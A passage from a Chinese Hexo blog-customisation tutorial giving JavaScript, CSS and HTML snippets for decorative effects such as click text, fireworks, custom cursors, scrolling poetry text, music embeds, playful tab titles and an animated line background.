class="hljs-string">&quot;&lt;span/&gt;&quot;</span>).text(a[a_idx]);<br>        a_idx = (a_idx + <span class="hljs-number">1</span>) % a.length;<br>        var x = e.pageX,<br>        y = e.pageY;<br>        $i.css(&#123;<br>            <span class="hljs-string">&quot;z-index&quot;</span>: <span class="hljs-number">5</span>,<br>            <span class="hljs-string">&quot;top&quot;</span>: y - <span class="hljs-number">20</span>,<br>            <span class="hljs-string">&quot;left&quot;</span>: x,<br>            <span class="hljs-string">&quot;position&quot;</span>: <span class="hljs-string">&quot;absolute&quot;</span>,<br>            <span class="hljs-string">&quot;font-weight&quot;</span>: <span class="hljs-string">&quot;bold&quot;</span>,<br>            <span class="hljs-string">&quot;color&quot;</span>: <span class="hljs-string">&quot;#FF0000&quot;</span><br>        &#125;);<br>        $(<span class="hljs-string">&quot;body&quot;</span>).append($i);<br>        $i.animate(&#123;<br>            <span class="hljs-string">&quot;top&quot;</span>: y - <span class="hljs-number">180</span>,<br>            <span class="hljs-string">&quot;opacity&quot;</span>: <span class="hljs-number">0</span><br>        &#125;,<br><span class="hljs-number">3000</span>,<br>function() &#123;<br>    $i.remove();<br>&#125;);<br>    &#125;);<br>    setTimeout(&#x27;delay()&#x27;, 2000);<br>&#125;);<br><br><span class="hljs-function">function <span class="hljs-title">delay</span><span class="hljs-params">()</span> </span>&#123;<br>    $(<span class="hljs-string">&quot;.buryit&quot;</span>).removeAttr(<span class="hljs-string">&quot;onclick&quot;</span>);<br>&#125;<br></code></pre></div></td></tr></table></figure><p>文字可以任意替换成自己的。<br>如果想要每次点击显示的文字为不同颜色，可以将其中 color 值进行如下更改：</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-string">&quot;color&quot;</span>: <span class="hljs-string">&quot;rgb(&quot;</span> + ~~(<span class="hljs-number">255</span> * Math.random()) + <span class="hljs-string">&quot;,&quot;</span> + ~~(<span class="hljs-number">255</span> * Math.random()) + <span class="hljs-string">&quot;,&quot;</span> + ~~(<span class="hljs-number">255</span> * Math.random()) + <span class="hljs-string">&quot;)&quot;</span><br></code></pre></div></td></tr></table></figure><p>然后在 \themes\hexo-theme-spfk\layout\layout.ejs 文件末尾添加以下代码：</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++">&lt;!--单击显示文字--&gt;<br>&lt;script type=<span class="hljs-string">&quot;text/javascript&quot;</span> src=<span class="hljs-string">&quot;/js/click_show_text.js&quot;</span>&gt;&lt;/script&gt;<br></code></pre></div></td></tr></table></figure><p>最后就可以看见效果了。</p><h3 id="4-添加鼠标点击烟花爆炸效果"><a href="#4-添加鼠标点击烟花爆炸效果" class="headerlink" title="4.添加鼠标点击烟花爆炸效果"></a>4.添加鼠标点击烟花爆炸效果</h3><p>在 \themes\material-x\source\js 目录下新建一个 fireworks.js 的文件，里面写入以下代码：</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-string">&quot;use strict&quot;</span>;<span class="hljs-function">function <span class="hljs-title">updateCoords</span><span class="hljs-params">(e)</span></span>&#123;pointerX=(e.clientX||e.touches[<span class="hljs-number">0</span>].clientX)-canvasEl.getBoundingClientRect().left,pointerY=e.clientY||e.touches[<span class="hljs-number">0</span>].clientY-canvasEl.getBoundingClientRect().top&#125;function setParticuleDirection(e)&#123;var t=anime.random(<span class="hljs-number">0</span>,<span class="hljs-number">360</span>)*Math.PI/<span class="hljs-number">180</span>,a=anime.random(<span class="hljs-number">50</span>,<span class="hljs-number">180</span>),n=[<span class="hljs-number">-1</span>,<span class="hljs-number">1</span>][anime.random(<span class="hljs-number">0</span>,<span class="hljs-number">1</span>)]*a;<span class="hljs-keyword">return</span>&#123;x:e.x+n*Math.<span class="hljs-built_in">cos</span>(t),y:e.y+n*Math.<span class="hljs-built_in">sin</span>(t)&#125;&#125;function createParticule(e,t)&#123;var a=&#123;&#125;;<span class="hljs-keyword">return</span> a.x=e,a.y=t,a.color=colors[anime.random(<span class="hljs-number">0</span>,colors.length<span class="hljs-number">-1</span>)],a.radius=anime.random(<span class="hljs-number">16</span>,<span class="hljs-number">32</span>),a.endPos=setParticuleDirection(a),a.draw=function()&#123;ctx.beginPath(),ctx.arc(a.x,a.y,a.radius,<span class="hljs-number">0</span>,<span class="hljs-number">2</span>*Math.PI,!<span class="hljs-number">0</span>),ctx.fillStyle=a.color,ctx.fill()&#125;,a&#125;function createCircle(e,t)&#123;var a=&#123;&#125;;<span class="hljs-keyword">return</span> a.x=e,a.y=t,a.color=<span class="hljs-string">&quot;#F00&quot;</span>,a.radius=<span class="hljs-number">0.1</span>,a.alpha=<span class="hljs-number">0.5</span>,a.lineWidth=<span class="hljs-number">6</span>,a.draw=function()&#123;ctx.globalAlpha=a.alpha,ctx.beginPath(),ctx.arc(a.x,a.y,a.radius,<span class="hljs-number">0</span>,<span class="hljs-number">2</span>*Math.PI,!<span class="hljs-number">0</span>),ctx.lineWidth=a.lineWidth,ctx.strokeStyle=a.color,ctx.stroke(),ctx.globalAlpha=<span class="hljs-number">1</span>&#125;,a&#125;function renderParticule(e)&#123;<span class="hljs-keyword">for</span>(var t=<span class="hljs-number">0</span>;t&lt;e.animatables.length;t++)&#123;e.animatables[t].target.draw()&#125;&#125;function animateParticules(e,t)&#123;<span class="hljs-keyword">for</span>(var a=createCircle(e,t),n=[],i=<span class="hljs-number">0</span>;i&lt;numberOfParticules;i++)&#123;n.push(createParticule(e,t))&#125;anime.timeline().add(&#123;targets:n,x:function(e)&#123;<span class="hljs-keyword">return</span> e.endPos.x&#125;,y:function(e)&#123;<span class="hljs-keyword">return</span> e.endPos.y&#125;,radius:<span class="hljs-number">0.1</span>,duration:anime.random(<span class="hljs-number">1200</span>,<span class="hljs-number">1800</span>),easing:<span class="hljs-string">&quot;easeOutExpo&quot;</span>,update:renderParticule&#125;).add(&#123;targets:a,radius:anime.random(<span class="hljs-number">80</span>,<span class="hljs-number">160</span>),lineWidth:<span class="hljs-number">0</span>,alpha:&#123;value:<span class="hljs-number">0</span>,easing:<span class="hljs-string">&quot;linear&quot;</span>,duration:anime.random(<span class="hljs-number">600</span>,<span class="hljs-number">800</span>)&#125;,duration:anime.random(<span class="hljs-number">1200</span>,<span class="hljs-number">1800</span>),easing:<span class="hljs-string">&quot;easeOutExpo&quot;</span>,update:renderParticule,offset:<span class="hljs-number">0</span>&#125;)&#125;function debounce(e,t)&#123;var a;<span class="hljs-keyword">return</span> function()&#123;var n=<span class="hljs-keyword">this</span>,i=arguments;clearTimeout(a),a=setTimeout(function()&#123;e.apply(n,i)&#125;,t)&#125;&#125;var canvasEl=document.querySelector(<span class="hljs-string">&quot;.fireworks&quot;</span>);<span class="hljs-keyword">if</span>(canvasEl)&#123;var ctx=canvasEl.getContext(<span class="hljs-string">&quot;2d&quot;</span>),numberOfParticules=<span class="hljs-number">30</span>,pointerX=<span class="hljs-number">0</span>,pointerY=<span class="hljs-number">0</span>,tap=<span class="hljs-string">&quot;mousedown&quot;</span>,colors=[<span class="hljs-string">&quot;#FF1461&quot;</span>,<span class="hljs-string">&quot;#18FF92&quot;</span>,<span class="hljs-string">&quot;#5A87FF&quot;</span>,<span class="hljs-string">&quot;#FBF38C&quot;</span>],setCanvasSize=debounce(function()&#123;canvasEl.width=<span class="hljs-number">2</span>*window.innerWidth,canvasEl.height=<span class="hljs-number">2</span>*window.innerHeight,canvasEl.style.width=window.innerWidth+<span class="hljs-string">&quot;px&quot;</span>,canvasEl.style.height=window.innerHeight+<span class="hljs-string">&quot;px&quot;</span>,canvasEl.getContext(<span class="hljs-string">&quot;2d&quot;</span>).scale(<span class="hljs-number">2</span>,<span class="hljs-number">2</span>)&#125;,<span class="hljs-number">500</span>),render=anime(&#123;duration:<span class="hljs-number">1</span>/<span class="hljs-number">0</span>,update:function()&#123;ctx.clearRect(<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,canvasEl.width,canvasEl.height)&#125;&#125;);document.addEventListener(tap,function(e)&#123;<span class="hljs-string">&quot;sidebar&quot;</span>!==e.target.id&amp;&amp;<span class="hljs-string">&quot;toggle-sidebar&quot;</span>!==e.target.id&amp;&amp;<span class="hljs-string">&quot;A&quot;</span>!==e.target.nodeName&amp;&amp;<span class="hljs-string">&quot;IMG&quot;</span>!==e.target.nodeName&amp;&amp;(render.play(),updateCoords(e),animateParticules(pointerX,pointerY))&#125;,!<span class="hljs-number">1</span>),setCanvasSize(),window.addEventListener(<span class="hljs-string">&quot;resize&quot;</span>,setCanvasSize,!<span class="hljs-number">1</span>)&#125;<span class="hljs-string">&quot;use strict&quot;</span>;<span class="hljs-function">function <span class="hljs-title">updateCoords</span><span class="hljs-params">(e)</span></span>&#123;pointerX=(e.clientX||e.touches[<span class="hljs-number">0</span>].clientX)-canvasEl.getBoundingClientRect().left,pointerY=e.clientY||e.touches[<span class="hljs-number">0</span>].clientY-canvasEl.getBoundingClientRect().top&#125;function setParticuleDirection(e)&#123;var t=anime.random(<span class="hljs-number">0</span>,<span class="hljs-number">360</span>)*Math.PI/<span class="hljs-number">180</span>,a=anime.random(<span class="hljs-number">50</span>,<span class="hljs-number">180</span>),n=[<span class="hljs-number">-1</span>,<span class="hljs-number">1</span>][anime.random(<span class="hljs-number">0</span>,<span class="hljs-number">1</span>)]*a;<span class="hljs-keyword">return</span>&#123;x:e.x+n*Math.<span class="hljs-built_in">cos</span>(t),y:e.y+n*Math.<span class="hljs-built_in">sin</span>(t)&#125;&#125;function createParticule(e,t)&#123;var a=&#123;&#125;;<span class="hljs-keyword">return</span> a.x=e,a.y=t,a.color=colors[anime.random(<span class="hljs-number">0</span>,colors.length<span class="hljs-number">-1</span>)],a.radius=anime.random(<span class="hljs-number">16</span>,<span class="hljs-number">32</span>),a.endPos=setParticuleDirection(a),a.draw=function()&#123;ctx.beginPath(),ctx.arc(a.x,a.y,a.radius,<span class="hljs-number">0</span>,<span class="hljs-number">2</span>*Math.PI,!<span class="hljs-number">0</span>),ctx.fillStyle=a.color,ctx.fill()&#125;,a&#125;function createCircle(e,t)&#123;var a=&#123;&#125;;<span class="hljs-keyword">return</span> a.x=e,a.y=t,a.color=<span class="hljs-string">&quot;#F00&quot;</span>,a.radius=<span class="hljs-number">0.1</span>,a.alpha=<span class="hljs-number">0.5</span>,a.lineWidth=<span class="hljs-number">6</span>,a.draw=function()&#123;ctx.globalAlpha=a.alpha,ctx.beginPath(),ctx.arc(a.x,a.y,a.radius,<span class="hljs-number">0</span>,<span class="hljs-number">2</span>*Math.PI,!<span class="hljs-number">0</span>),ctx.lineWidth=a.lineWidth,ctx.strokeStyle=a.color,ctx.stroke(),ctx.globalAlpha=<span class="hljs-number">1</span>&#125;,a&#125;function renderParticule(e)&#123;<span class="hljs-keyword">for</span>(var t=<span class="hljs-number">0</span>;t&lt;e.animatables.length;t++)&#123;e.animatables[t].target.draw()&#125;&#125;function animateParticules(e,t)&#123;<span class="hljs-keyword">for</span>(var a=createCircle(e,t),n=[],i=<span class="hljs-number">0</span>;i&lt;numberOfParticules;i++)&#123;n.push(createParticule(e,t))&#125;anime.timeline().add(&#123;targets:n,x:function(e)&#123;<span class="hljs-keyword">return</span> e.endPos.x&#125;,y:function(e)&#123;<span class="hljs-keyword">return</span> e.endPos.y&#125;,radius:<span class="hljs-number">0.1</span>,duration:anime.random(<span class="hljs-number">1200</span>,<span class="hljs-number">1800</span>),easing:<span class="hljs-string">&quot;easeOutExpo&quot;</span>,update:renderParticule&#125;).add(&#123;targets:a,radius:anime.random(<span class="hljs-number">80</span>,<span class="hljs-number">160</span>),lineWidth:<span class="hljs-number">0</span>,alpha:&#123;value:<span class="hljs-number">0</span>,easing:<span class="hljs-string">&quot;linear&quot;</span>,duration:anime.random(<span class="hljs-number">600</span>,<span class="hljs-number">800</span>)&#125;,duration:anime.random(<span class="hljs-number">1200</span>,<span class="hljs-number">1800</span>),easing:<span class="hljs-string">&quot;easeOutExpo&quot;</span>,update:renderParticule,offset:<span class="hljs-number">0</span>&#125;)&#125;function debounce(e,t)&#123;var a;<span class="hljs-keyword">return</span> function()&#123;var n=<span class="hljs-keyword">this</span>,i=arguments;clearTimeout(a),a=setTimeout(function()&#123;e.apply(n,i)&#125;,t)&#125;&#125;var canvasEl=document.querySelector(<span class="hljs-string">&quot;.fireworks&quot;</span>);<span class="hljs-keyword">if</span>(canvasEl)&#123;var ctx=canvasEl.getContext(<span class="hljs-string">&quot;2d&quot;</span>),numberOfParticules=<span class="hljs-number">30</span>,pointerX=<span class="hljs-number">0</span>,pointerY=<span class="hljs-number">0</span>,tap=<span class="hljs-string">&quot;mousedown&quot;</span>,colors=[<span class="hljs-string">&quot;#FF1461&quot;</span>,<span class="hljs-string">&quot;#18FF92&quot;</span>,<span class="hljs-string">&quot;#5A87FF&quot;</span>,<span class="hljs-string">&quot;#FBF38C&quot;</span>],setCanvasSize=debounce(function()&#123;canvasEl.width=<span class="hljs-number">2</span>*window.innerWidth,canvasEl.height=<span class="hljs-number">2</span>*window.innerHeight,canvasEl.style.width=window.innerWidth+<span class="hljs-string">&quot;px&quot;</span>,canvasEl.style.height=window.innerHeight+<span class="hljs-string">&quot;px&quot;</span>,canvasEl.getContext(<span class="hljs-string">&quot;2d&quot;</span>).scale(<span class="hljs-number">2</span>,<span class="hljs-number">2</span>)&#125;,<span class="hljs-number">500</span>),render=anime(&#123;duration:<span class="hljs-number">1</span>/<span class="hljs-number">0</span>,update:function()&#123;ctx.clearRect(<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,canvasEl.width,canvasEl.height)&#125;&#125;);document.addEventListener(tap,function(e)&#123;<span class="hljs-string">&quot;sidebar&quot;</span>!==e.target.id&amp;&amp;<span class="hljs-string">&quot;toggle-sidebar&quot;</span>!==e.target.id&amp;&amp;<span class="hljs-string">&quot;A&quot;</span>!==e.target.nodeName&amp;&amp;<span class="hljs-string">&quot;IMG&quot;</span>!==e.target.nodeName&amp;&amp;(render.play(),updateCoords(e),animateParticules(pointerX,pointerY))&#125;,!<span class="hljs-number">1</span>),setCanvasSize(),window.addEventListener(<span class="hljs-string">&quot;resize&quot;</span>,setCanvasSize,!<span class="hljs-number">1</span>)&#125;;<br></code></pre></div></td></tr></table></figure><p>然后在 \themes\material-x\layout\layout.ejs 文件中写入以下代码：</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++">&lt;canvas <span class="hljs-class"><span class="hljs-keyword">class</span>=</span><span class="hljs-string">&quot;fireworks&quot;</span> style=<span class="hljs-string">&quot;position: fixed;left: 0;top: 0;z-index: 1; pointer-events: none;&quot;</span> &gt;&lt;/canvas&gt; <br>&lt;script type=<span class="hljs-string">&quot;text/javascript&quot;</span> src=<span class="hljs-string">&quot;//cdn.bootcss.com/animejs/2.2.0/anime.min.js&quot;</span>&gt;&lt;/script&gt; <br>&lt;script type=<span class="hljs-string">&quot;text/javascript&quot;</span> src=<span class="hljs-string">&quot;/js/fireworks.js&quot;</span>&gt;&lt;/script&gt;<br></code></pre></div></td></tr></table></figure><p>完成后，点击鼠标时就可以看见爆炸效果了。</p><h3 id="5-自定义鼠标指针样式"><a href="#5-自定义鼠标指针样式" class="headerlink" title="5.自定义鼠标指针样式"></a>5.自定义鼠标指针样式</h3><p>在 \themes\material-x\source\less_base.less 文件 body 样式里写入如下代码：</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++">body &#123;<br>    cursor: url(https:<span class="hljs-comment">//cdn.jsdelivr.net/gh/TRHX/CDN-for-itrhx.com@2.1.6/images/mouse.cur),auto;</span><br>    background-color: @theme_background;<br>    ......<br>    ......<br>&#125;<br><br></code></pre></div></td></tr></table></figure><p>鼠标指针可以用 Axialis CursorWorkshop 这个软件自己制作，不同主题具体放的文件有所不同，确保在博客主体 body 的 CSS 文件中即可，其中的鼠标指针链接可替换成自己的，首先尝试加载<a href="https://cdn.jsdelivr.net/gh/TRHX/CDN-for-itrhx.com@2.1.6/images/mouse.cur">https://cdn.jsdelivr.net/gh/TRHX/CDN-for-itrhx.com@2.1.6/images/mouse.cur</a> ，如果该文件不存在或由于其他原因无效，那么 auto 会被使用，也就是自动默认效果，图片格式为.ico、.ani、.cur，建议使用.cur，如果使用.ani或者其他格式无效，原因是浏览器兼容问题，请阅读<a href="https://developer.mozilla.org/en-US/docs/Web/CSS/CSS_Basic_User_Interface/Using_URL_values_for_the_cursor_property">参考文档</a>。</p><h3 id="6-添加彩色滚动变换字体"><a href="#6-添加彩色滚动变换字体" class="headerlink" title="6.添加彩色滚动变换字体"></a>6.添加彩色滚动变换字体</h3><p>在你想要添加彩色滚动变换字体的地方写入以下代码即可，其中文字可自行更改：</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;binft&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><br><span class="javascript">    <span class="hljs-keyword">var</span> binft = <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">r</span>) </span>&#123;</span><br><span class="javascript">      <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">t</span>(<span class="hljs-params"></span>) </span>&#123;</span><br><span class="javascript">        <span class="hljs-keyword">return</span> b[<span class="hljs-built_in">Math</span>.floor(<span class="hljs-built_in">Math</span>.random() * b.length)]</span><br>      &#125;  <br><span class="javascript">      <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">e</span>(<span class="hljs-params"></span>) </span>&#123;</span><br><span class="javascript">        <span class="hljs-keyword">return</span> <span class="hljs-built_in">String</span>.fromCharCode(<span class="hljs-number">94</span> * <span class="hljs-built_in">Math</span>.random() + <span class="hljs-number">33</span>)</span><br>      &#125;<br><span class="javascript">      <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">n</span>(<span class="hljs-params">r</span>) </span>&#123;</span><br><span class="javascript">        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> n = <span class="hljs-built_in">document</span>.createDocumentFragment(), i = <span class="hljs-number">0</span>; r &gt; i; i++) &#123;</span><br><span class="javascript">          <span class="hljs-keyword">var</span> l = <span class="hljs-built_in">document</span>.createElement(<span class="hljs-string">&quot;span&quot;</span>);</span><br>          l.textContent = e(), l.style.color = t(), n.appendChild(l)<br>        &#125;<br><span class="javascript">        <span class="hljs-keyword">return</span> n</span><br>      &#125;<br><span class="javascript">      <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">i</span>(<span class="hljs-params"></span>) </span>&#123;</span><br><span class="javascript">        <span class="hljs-keyword">var</span> t = o[c.skillI];</span><br><span class="javascript">        c.step ? c.step-- : (c.step = g, c.prefixP &lt; l.length ? (c.prefixP &gt;= <span class="hljs-number">0</span> &amp;&amp; (c.text += l[c.prefixP]), c.prefixP++) : <span class="hljs-string">&quot;forward&quot;</span> === c.direction ? c.skillP &lt; t.length ? (c.text += t[c.skillP], c.skillP++) : c.delay ? c.delay-- : (c.direction = <span class="hljs-string">&quot;backward&quot;</span>, c.delay = a) : c.skillP &gt; <span class="hljs-number">0</span> ? (c.text = c.text.slice(<span class="hljs-number">0</span>, -<span class="hljs-number">1</span>), c.skillP--) : (c.skillI = (c.skillI + <span class="hljs-number">1</span>) % o.length, c.direction = <span class="hljs-string">&quot;forward&quot;</span>)), r.textContent = c.text, r.appendChild(n(c.prefixP &lt; l.length ? <span class="hljs-built_in">Math</span>.min(s, s + c.prefixP) : <span class="hljs-built_in">Math</span>.min(s, t.length - c.skillP))), <span class="hljs-built_in">setTimeout</span>(i, d)</span><br>      &#125;<br><span class="javascript">      <span class="hljs-keyword">var</span> l = <span class="hljs-string">&quot;&quot;</span>,</span><br><span class="javascript">      o = [<span class="hljs-string">&quot;青青陵上柏，磊磊涧中石。&quot;</span>, <span class="hljs-string">&quot;人生天地间，忽如远行客。&quot;</span>,<span class="hljs-string">&quot;斗酒相娱乐，聊厚不为薄。&quot;</span>, <span class="hljs-string">&quot;驱车策驽马，游戏宛与洛。&quot;</span>,<span class="hljs-string">&quot;洛中何郁郁，冠带自相索。&quot;</span>,<span class="hljs-string">&quot;长衢罗夹巷，王侯多第宅。&quot;</span>,<span class="hljs-string">&quot;两宫遥相望，双阙百余尺。&quot;</span>,<span class="hljs-string">&quot;极宴娱心意，戚戚何所迫？&quot;</span>].map(<span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">r</span>) </span>&#123;</span><br><span class="javascript">      <span class="hljs-keyword">return</span> r + <span class="hljs-string">&quot;&quot;</span></span><br>      &#125;),<br>      a = 2,<br>      g = 1,<br>      s = 5,<br>      d = 75,<br><span class="javascript">      b = [<span class="hljs-string">&quot;rgb(110,64,170)&quot;</span>, <span class="hljs-string">&quot;rgb(150,61,179)&quot;</span>, <span class="hljs-string">&quot;rgb(191,60,175)&quot;</span>, <span class="hljs-string">&quot;rgb(228,65,157)&quot;</span>, <span class="hljs-string">&quot;rgb(254,75,131)&quot;</span>, <span class="hljs-string">&quot;rgb(255,94,99)&quot;</span>, <span class="hljs-string">&quot;rgb(255,120,71)&quot;</span>, <span class="hljs-string">&quot;rgb(251,150,51)&quot;</span>, <span class="hljs-string">&quot;rgb(226,183,47)&quot;</span>, <span class="hljs-string">&quot;rgb(198,214,60)&quot;</span>, <span class="hljs-string">&quot;rgb(175,240,91)&quot;</span>, <span class="hljs-string">&quot;rgb(127,246,88)&quot;</span>, <span class="hljs-string">&quot;rgb(82,246,103)&quot;</span>, <span class="hljs-string">&quot;rgb(48,239,130)&quot;</span>, <span class="hljs-string">&quot;rgb(29,223,163)&quot;</span>, <span class="hljs-string">&quot;rgb(26,199,194)&quot;</span>, <span class="hljs-string">&quot;rgb(35,171,216)&quot;</span>, <span class="hljs-string">&quot;rgb(54,140,225)&quot;</span>, <span class="hljs-string">&quot;rgb(76,110,219)&quot;</span>, <span class="hljs-string">&quot;rgb(96,84,200)&quot;</span>],</span><br>      c = &#123;<br><span class="javascript">        text: <span class="hljs-string">&quot;&quot;</span>,</span><br>        prefixP: -s,<br>        skillI: 0,<br>        skillP: 0,<br><span class="javascript">        direction: <span class="hljs-string">&quot;forward&quot;</span>,</span><br>        delay: a,<br>        step: g<br>      &#125;;<br>      i()<br>      &#125;;<br><span class="javascript">      binft(<span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">&#x27;binft&#x27;</span>));</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><br></code></pre></div></td></tr></table></figure><h3 id="7-添加背景音乐"><a href="#7-添加背景音乐" class="headerlink" title="7.添加背景音乐"></a>7.添加背景音乐</h3><p>打开网页版网易云音乐，选择你准备添加的背景音乐，点击生成外链播放器，前提是要有版权，不然是无法生成外链播放器的，复制底下的HTML代码.然后将此代码放到你想要放的地方，比如放在博客的左侧，则打开 \themes\hexo-theme-spfk\layout_partial\left-col.ejs 文件，将复制的HTML代码粘贴进去，再进行适当的位置设置让播放器更美观，其中 auto=1 表示打开网页自动播放音乐，auto=0 表示关闭自动播放音乐.<br>这种网易云音乐外链的方式有很多局限性，因此推荐使用aplayer，GitHub地址为：<a href="https://github.com/MoePlayer/APlayer">https://github.com/MoePlayer/APlayer</a> </p><h3 id="8-浏览器网页标题动态改变"><a href="#8-浏览器网页标题动态改变" class="headerlink" title="8.浏览器网页标题动态改变"></a>8.浏览器网页标题动态改变</h3><p>当用户访问你的博客时点击到了其他网页，我们可以改变一下网页标题，呼唤用户回来，首先在目录 \themes\material-x\source\js 下新建一个 FunnyTitle.js 文件，在里面填写如下代码：</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html">// 浏览器标题<br>var OriginTitle = document.title;<br>var titleTime;<br>document.addEventListener(&#x27;visibilitychange&#x27;, function () &#123;<br>    if (document.hidden) &#123;<br>        $(&#x27;[rel=&quot;icon&quot;]&#x27;).attr(&#x27;href&#x27;, &quot;/funny.ico&quot;);<br>        document.title = &#x27;╭(°A°`)╮ 页面崩溃啦 ~&#x27;;<br>        clearTimeout(titleTime);<br>    &#125;<br>    else &#123;<br>        $(&#x27;[rel=&quot;icon&quot;]&#x27;).attr(&#x27;href&#x27;, &quot;/favicon.ico&quot;);<br>        document.title = &#x27;(ฅ&gt;ω&lt;*ฅ) 噫又好啦 ~&#x27; + OriginTitle;<br>        titleTime = setTimeout(function () &#123;<br>            document.title = OriginTitle;<br>        &#125;, 2000);<br>    &#125;<br>&#125;);<br><br></code></pre></div></td></tr></table></figure><p>其中 funny.ico 是用户切换到其他标签后你网站的图标，favicon.ico 是正常图标，然后在 \themes\material-x\layout\layout.ejs 文件中添加如下代码：</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-comment">&lt;!--浏览器搞笑标题--&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/javascript&quot;</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;/js/FunnyTitle.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><br></code></pre></div></td></tr></table></figure><p>之后就可以去试试效果了。</p><h3 id="9-背景添加动态线条效果"><a href="#9-背景添加动态线条效果" class="headerlink" title="9.背景添加动态线条效果"></a>9.背景添加动态线条效果</h3><p>在 \Hexo\themes\hexo-theme-spfk\layout\layout.ejs 文件中添加如下代码：</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-comment">&lt;!--动态线条背景--&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/javascript&quot;</span></span><br><span class="hljs-tag"><span class="hljs-attr">color</span>=<span class="hljs-string">&quot;220,220,220&quot;</span> <span class="hljs-attr">opacity</span>=<span class="hljs-string">&#x27;0.7&#x27;</span> <span class="hljs-attr">zIndex</span>=<span class="hljs-string">&quot;-2&quot;</span> <span class="hljs-attr">count</span>=<span class="hljs-string">&quot;200&quot;</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><br></code></pre></div></td></tr></table></figure><p>其中：</p><p>color：表示线条颜色，三个数字分别为(R,G,B)，默认：（0,0,0）<br>opacity：表示线条透明度（0~1），默认：0.5<br>count：表示线条的总数量，默认：150<br>zIndex：表示背景的z-index属性，css属性用于控制所在层的位置，默认：-1</p><p>之后就可以看见效果了。</p><h3 id="10-添加人体时钟等有趣的挂件"><a href="#10-添加人体时钟等有趣的挂件" class="headerlink" title="10.添加人体时钟等有趣的挂件"></a>10.添加人体时钟等有趣的挂件</h3><p>在你的博客上有合适的地方，加上。实现代码：</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs 